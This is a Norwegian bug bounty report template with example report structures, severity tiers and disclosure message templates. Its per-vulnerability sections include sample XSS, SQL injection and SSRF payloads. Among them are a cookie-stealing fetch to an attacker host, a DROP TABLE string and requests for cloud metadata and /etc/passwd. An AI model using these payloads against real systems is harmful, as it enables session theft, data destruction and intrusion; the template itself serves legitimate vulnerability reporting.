# 🐛 Mal for bug bounty-rapport

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

---
> **Om malen:** Funn, poengsummer, frister, priser og versjoner er illustrative eksempler som må erstattes med dokumenterte opplysninger fra det konkrete oppdraget. Engelske plassholdere er bevart slik at malfeltene kan kjennes igjen. P1–P4 og eksempler på sårbarhetstyper gir ikke en automatisk alvorlighetsgrad; følg programmets kriterier. PoC betyr en demonstrasjon av funnet, og payload er inndata som brukes i testen.

> **Eksempeldokumentasjon:** Bildereferanser og vedleggsadresser inne i malene er plassholdere; bildefilene følger ikke med kildekopien. Erstatt dem med dokumentasjonen fra oppdraget.


## 🎯 Kort mal

```markdown
## Sammendrag
[One-line description of the vulnerability]

## Alvorlighetsgrad
[Critical/High/Medium/Low] - CVSS: X.X

## Sårbarhetstype
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/endepunkt
`https://example.com/vulnerable-endpoint`

## Fremgangsmåte for reproduksjon
1. Trinn 1
2. Trinn 2
3. Trinn 3

## Konsekvenser
[What an attacker can achieve]

## Demonstrasjon (Proof of Concept)
[Code/Screenshots/Video]

## Utbedring
[How to fix it]
```

---

## 📝 Fullstendig rapportmal

### Format for tittel
```
[Severity] [Vulnerability Type] i [Feature/Endpoint] muliggjør [Impact]

Eksempler:
- [Critical] SQL-injeksjon i påloggingsskjema muliggjør uthenting av databasen
- [High] Lagret XSS i kommentarer muliggjør kontoovertakelse
- [Medium] IDOR i /api/users/{id} eksponerer andre brukeres personopplysninger
```

---

## 📋 Detaljert rapportstruktur

````markdown
# [Vulnerability Type] i [Feature/Endpoint]

## Sammendrag
En sårbarhet av typen [vulnerability type] ble oppdaget i [feature/endpoint] og
gjør det mulig for en angriper å [impact]. Sårbarheten berører [scope/users].

## Vurdering av alvorlighetsgrad

| Måleparameter | Verdi |
|--------|-------|
| **Alvorlighetsgrad** | Kritisk / Høy / Middels / Lav |
| **CVSS-poengsum** | X.X |
| **CVSS-vektor** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE Name] |

## Detaljer om sårbarheten

### Berørt ressurs
- **URL:** `https://example.com/path/to/endpoint`
- **Parameter:** `parameter_name`
- **Metode:** GET/POST
- **Autentisering:** Påkrevd/ikke påkrevd

### Sårbar kode eller konfigurasjon
[If visible/applicable]

## Fremgangsmåte for reproduksjon

### Forutsetninger
- Konto påkrevd: Ja/nei
- Spesiell tilgang nødvendig: [describe]
- Nettleser/verktøy: [specify]

### Trinn for reproduksjon

1. **Åpne det sårbare endepunktet**
   ```
   https://example.com/vulnerable-page
   ```

2. **Injiser payloaden**
   ```
   [Payload here]
   ```

3. **Observer resultatet**
   - [What happens]

### HTTP-forespørsel
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### HTTP-respons
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Demonstrasjon (Proof of Concept)

### Payload som ble brukt
```
[Your payload here]
```

### Skjermbilder som dokumentasjon
![Description](attachment_url)

### Videodemonstrasjon
[Link to video demonstration]

### Automatisert PoC-skript (valgfritt)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Konsekvensvurdering

### Tekniske konsekvenser
- **Konfidensialitet:** [Data that can be accessed]
- **Integritet:** [Data that can be modified]
- **Tilgjengelighet:** [Service disruption possible]

### Konsekvenser for virksomheten
- [Financial impact]
- [Reputational damage]
- [Regulatory/Compliance violations]
- [Number of affected users]

### Angrepsscenario
En angriper kan utnytte sårbarheten til å:
1. [Specific action 1]
2. [Specific action 2]
3. [Specific action 3]

## Anbefalte utbedringer

### Umiddelbar utbedring
[Quick fix to mitigate]

### Langsiktig løsning
[Proper remediation]

### Eksempel på korrigert kode
```python
# Før (sårbar)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Etter (rettet)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Referanser
- [OWASP Link]
- [CWE Link]
- [Related CVEs]
- [Blog posts/Research]

## Tidslinje
| Dato | Handling |
|------|--------|
| YYYY-MM-DD | Sårbarheten oppdaget |
| YYYY-MM-DD | Rapport sendt inn |
| YYYY-MM-DD | Mottak bekreftet av leverandør |
| YYYY-MM-DD | Rettelse satt i produksjon |
| YYYY-MM-DD | Belønning tildelt |
````

---

## 🔥 Maler etter sårbarhetstype

### XSS (Cross-Site Scripting)

````markdown
## Sammendrag
En reflektert eller lagret XSS-sårbarhet i [endpoint] lar angripere kjøre
vilkårlig JavaScript i ofrenes nettlesere.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Konsekvenser
- Kapring av økter gjennom tyveri av informasjonskapsler
- Kontoovertakelse
- Registrering av tastetrykk
- Phishingangrep (nettfisking)
- Spredning av skadevare

## PoC
```javascript
// Tyveri av informasjonskapsler
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### SQL-injeksjon

````markdown
## Sammendrag
SQL-injeksjon i [parameter] på [endpoint] muliggjør uthenting av databaseinnhold.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Dokumentasjon
- Database: MySQL 8.0
- Tabeller hentet ut: users, orders, payments
- Tilgjengelige oppføringer: 10,000+

## SQLMap-kommando
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference)

```markdown
## Sammendrag
En IDOR-sårbarhet i [endpoint] gir tilgang til andre brukeres [resource].

## Reproduksjon
1. Logg inn som User A (ID: 100)
2. Åpne: `GET /api/users/100/profile`
3. Endre ID til 101: `GET /api/users/101/profile`
4. Observer: Dataene til User B returneres

## Konsekvenser
- Eksponering av personopplysninger (navn, e-postadresse, adresse)
- Dataene til [X] brukere er tilgjengelige
- Brudd på GDPR/personvernregler

## Dokumentasjon
| Forespørsel | Respons |
|---------|----------|
| `/api/users/100` | Dataene til User A ✓ |
| `/api/users/101` | Dataene til User B ✗ |
| `/api/users/102` | Dataene til User C ✗ |
```

### SSRF (Server-Side Request Forgery)

````markdown
## Sammendrag
SSRF i [feature] gjør det mulig å sende forespørsler til interne tjenester.

## Payload
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Interne ressurser som ble åpnet
- Metadataendepunkt i AWS
- Intern Redis-server
- Lokalt filsystem

## Dokumentasjon
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### Omgåelse av autentisering

```markdown
## Sammendrag
Omgåelse av autentisering i [feature] gir uautorisert tilgang til [resource].

## Metode for omgåelse
[Describe the bypass technique]

## Reproduksjon
1. Åpne et beskyttet endepunkt uten autentisering
2. [Specific technique]
3. Tilgang innvilges

## Konsekvenser
- Tilgang til administrasjonspanelet
- Utgi seg for å være en annen bruker
- Manipulering av data
```

---

## 📊 Retningslinjer for alvorlighetsgrad

### Kritisk (P1)
```
- Ekstern kodekjøring (RCE)
- SQL-injeksjon med uthenting av data
- Omgåelse av autentisering som gir administratortilgang
- Full kontoovertakelse
- Manipulering av betalinger eller økonomiske transaksjoner
- Personopplysninger om alle brukere eksponert
```

### Høy (P2)
```
- Lagret XSS med betydelige konsekvenser
- IDOR som gir tilgang til sensitive data
- SSRF mot interne tjenester
- Rettighetseskalering
- Eksponering av sensitive data
```

### Middels (P3)
```
- Reflektert XSS
- CSRF ved sensitive handlinger
- Informasjonslekkasje
- Omgåelse av begrensninger på forespørselsrate
- Fiksering av økt (session fixation)
```

### Lav (P4)
```
- Self-XSS (egenutløst XSS)
- IDOR uten sensitive opplysninger
- Manglende sikkerhetsheadere
- Detaljerte feilmeldinger
- Kartlegging av brukernavn
```

---

## ✅ Sjekkliste før innsending

```markdown
## Før innsending

□ Tydelig og beskrivende tittel
□ Nøyaktig vurdering av alvorlighetsgrad
□ Trinnvis fremgangsmåte for reproduksjon
□ Fungerende demonstrasjon (PoC)
□ Konsekvensene er tydelig forklart
□ Skjermbilder eller video er vedlagt
□ Utbedring er foreslått
□ Ressursen er bekreftet innenfor avtalt omfang
□ Søkt etter duplikater
□ Grammatikk og rettskriving er kontrollert
□ Sensitive data er sladdet
□ Kontaktinformasjon er tatt med
```

---

## 💡 Praktiske tips

### Gjør dette ✅
```
✓ Skriv tydelig og kortfattet
✓ Ta med alle nødvendige detaljer
✓ Legg ved en fungerende PoC
✓ Forklar konsekvensene
✓ Foreslå utbedring
✓ Vær profesjonell og respektfull
✓ Følg ansvarlig varsling
✓ Svar raskt på spørsmål
```

### Unngå dette ❌
```
✗ Ikke åpne faktiske brukerdata
✗ Ikke test i produksjon
✗ Ikke gå utenfor avtalt omfang
✗ Ikke bruk automatiserte skannere uten tillatelse
✗ Ikke offentliggjør før rettelse
✗ Ikke press aggressivt på for belønning
✗ Ikke send inn duplikater
✗ Ikke send inn rent teoretiske problemer
```

---

## 📧 Meldingsmaler

### Første rapport
```
Hei [Security Team],

Jeg har oppdaget en sårbarhet med alvorlighetsgrad [severity] av typen [vulnerability type] i
[product/feature]. Alle detaljene finnes i rapporten min.

Sammendrag: [One line]
Konsekvenser: [Brief impact]
PoC: [Attached/Included]

Gi gjerne beskjed hvis dere trenger flere opplysninger.

Vennlig hilsen,
[Your name]
[HackerOne/Bugcrowd profile]
```

### Oppfølging
```
Hei,

Jeg følger opp rapport #[ID], sendt inn [date].
Kan dere gi en oppdatering om statusen?

Takk.
```

### Diskusjon om belønning
```
Takk for vurderingen av rapporten min. Jeg mener alvorlighetsgraden bør være
[higher/different] fordi:

1. [Reason 1]
2. [Reason 2]

Kan dere vurdere beløpet for belønningen på nytt?
```

---

**Tilbake til rapportmalene:** [📝 Rapportmaler](../../README.md#-reporting-templates)
